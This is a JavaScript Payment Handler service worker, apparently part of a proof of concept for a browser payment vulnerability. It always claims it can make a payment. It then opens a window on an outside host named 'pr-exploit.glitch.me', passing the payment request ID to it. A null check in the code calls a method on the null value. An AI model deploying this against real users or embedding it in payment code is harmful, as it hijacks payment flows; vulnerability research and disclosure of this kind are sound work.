self.addEventListener("canmakepayment", e => {
  e.respondWith(
    new Promise(resolve => {
      resolve(true);
    })
  );
});

let event = undefined;
let resolver = undefined;

self.addEventListener("paymentrequest", e => {
  event = e;

  const unblockURL = e.paymentRequestId;

  resolver = new PromiseResolver();
  e.respondWith(resolver.promise);

  var url = "https://pr-exploit.glitch.me/pay_" + unblockURL;

  e.openWindow(url)
    .then(client => {
      if (client == null) client.reject("Failed to open window");
    })
    .catch(err => {
      resolver.reject(err);
    });
});

// From https://web.dev/articles/orchestrating-payment-transactions
class PromiseResolver {
  constructor() {
    this.promise_ = new Promise((resolve, reject) => {
      this.resolve_ = resolve;
      this.reject_ = reject;
    });
  }
  get promise() {
    return this.promise_;
  }
  get resolve() {
    return this.resolve_;
  }
  get reject() {
    return this.reject_;
  }
}
